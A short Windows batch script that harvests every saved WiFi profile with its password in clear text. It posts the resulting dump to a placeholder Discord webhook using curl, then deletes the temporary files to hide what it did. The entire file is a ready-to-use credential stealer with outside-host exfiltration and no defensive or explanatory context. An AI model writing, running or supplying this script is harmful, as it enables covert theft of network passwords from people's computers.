@echo off
:: Extract WiFi passwords and save them
netsh wlan show profiles > %temp%\wifi.txt
for /f "tokens=2 delims=:" %%A in ('findstr "All User Profile" %temp%\wifi.txt') do netsh wlan show profile name=%%A key=clear >> %temp%\wifi_dump.txt

:: Send data to Discord Webhook
curl -X POST -H "Content-Type: application/json" --data-binary "@%temp%\wifi_dump.txt" "YOUR_DISCORD_WEBHOOK"

:: Clean up
del %temp%\wifi.txt
del %temp%\wifi_dump.txt
exit
